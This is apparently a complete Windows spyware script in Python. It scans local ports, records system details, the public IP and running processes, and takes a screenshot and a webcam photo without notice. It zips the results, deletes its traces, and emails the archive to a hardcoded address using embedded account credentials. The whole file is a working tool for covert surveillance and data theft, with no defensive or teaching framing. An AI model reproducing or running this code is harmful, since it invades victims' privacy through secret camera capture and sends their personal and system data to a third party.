import platform
import zipfile as zip
import os
from urllib.request import urlopen
import wmi
from mss import mss

#creating a zip file
zf=zip.ZipFile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\myzipfiles1s.zip', 'w')

##########################################################################################################

#Scanning of open ports

fp= open(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\portscanned.txt','w')
import socket
from concurrent.futures import ThreadPoolExecutor

THREADS = 512
CONNECTION_TIMEOUT = 1

def ping(host, port, results = None):
    try:
        socket.socket().connect((host, port))
        if results is not None:
            results.append(port)
        fp.write((str(port) + " Open \n"))
        return True
    except:
        return False

def scan_ports(host):
    available_ports = []
    socket.setdefaulttimeout(CONNECTION_TIMEOUT)
    with ThreadPoolExecutor(max_workers = THREADS) as executor:
        fp.write(str("\nScanning ports on \n " + host + " ..."))
        print()
        for port in range(1, 1025):
            executor.submit(ping, host, port, available_ports)
    fp.write(str("\nDone."))
    
def main():
    host_name = socket.gethostname()
    target_ip = socket.gethostbyname(host_name)
    scan_ports(target_ip)
if __name__ == "__main__":
    main()
            
                        
fp.close()        
zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\portscanned.txt')
##########################################################################################################
#writing system details
sysdet=platform.uname()
print(str(sysdet))
f1=open(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\uname.txt','w')
f1.write(str(sysdet))
f1.close();
zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\uname.txt')
##########################################################################################################

#writing system architecture info
sysarch=platform.architecture()
print(sysarch)
f2=open(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\arch.txt','w')
f2.write(str(sysarch))
f2.close()
zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\arch.txt')

##########################################################################################################

# writing system info

sysinfo = platform.system()
print(sysinfo)
f3= open(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\systeminfo.txt','w')
f3.write(str(sysinfo))
f3.close()
zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\systeminfo.txt')

##########################################################################################################


#writing public ip
my_ip = urlopen('http://ip.42.pl/raw').read()
print(my_ip)
f4= open(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\publicip.txt','w')
f4.write(str(my_ip))
f4.close()
zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\publicip.txt')

##########################################################################################################

#capturing running processes

pd=open(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\proc_list.txt','w')
c = wmi.WMI ()
for process in c.Win32_Process ():
  proc= process.ProcessId, process.Name
  pd.write(str(proc)+"\n")
pd.close();
zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\proc_list.txt')

##########################################################################################################

#Capturing the current screen


with mss() as sct:
 filename = sct.shot(mon=-1, output= os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\sceenshot.png')

zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\sceenshot.png')
##########################################################################################################

#capturing webcam image
import cv2
camera_port = 0
ramp_frames = 30
camera = cv2.VideoCapture(camera_port)

def get_image():
 retval, im = camera.read()
 return im

for i in range(ramp_frames):
 temp = get_image()
camera_capture = get_image()
file = os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\wcamshot.png'
cv2.imwrite(file, camera_capture) 
del(camera)

zf.write(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\wcamshot.png')

##########################################################################################################


#closing Zip File
zf.close()

##########################################################################################################

#deleting files after zipping
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\uname.txt'): 
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\uname.txt')
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\arch.txt'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\arch.txt')
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\systeminfo.txt'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\systeminfo.txt')

if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\publicip.txt'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\publicip.txt')
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\proc_list.txt'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\proc_list.txt')
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\sceenshot.png'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\sceenshot.png')
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\wcamshot.png'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\wcamshot.png')
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\portscanned.txt'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\portscanned.txt')



##########################################################################################################


#sending of email with the collected data
from smtplib import SMTP_SSL
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

filepath = os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\myzipfiles1s.zip'
fromaddr = "udn110@yahoo.com"
toaddr = "jain.eh2018@gmail.com"
password = 'Pantoz123$'
mail_adr = 'smtp.mail.yahoo.com'
mail_port = 465

# Compose attachment
part = MIMEBase('application', "octet-stream")
part.set_payload(open(filepath, "rb").read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % os.path.basename(filepath))

# Compose message
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg.attach(part)


# Send mail
smtp = SMTP_SSL()
socket.setdefaulttimeout(1800)
smtp.set_debuglevel(1)
smtp.connect(mail_adr, mail_port)
smtp.login(fromaddr, password)
smtp.sendmail(fromaddr, toaddr, msg.as_string())

smtp.quit()
###############################################################################################################
if os.path.isfile(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\myzipfiles1s.zip'):
    os.remove(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Local\\Temp\\myzipfiles1s.zip')

exit()

##########################################################################################################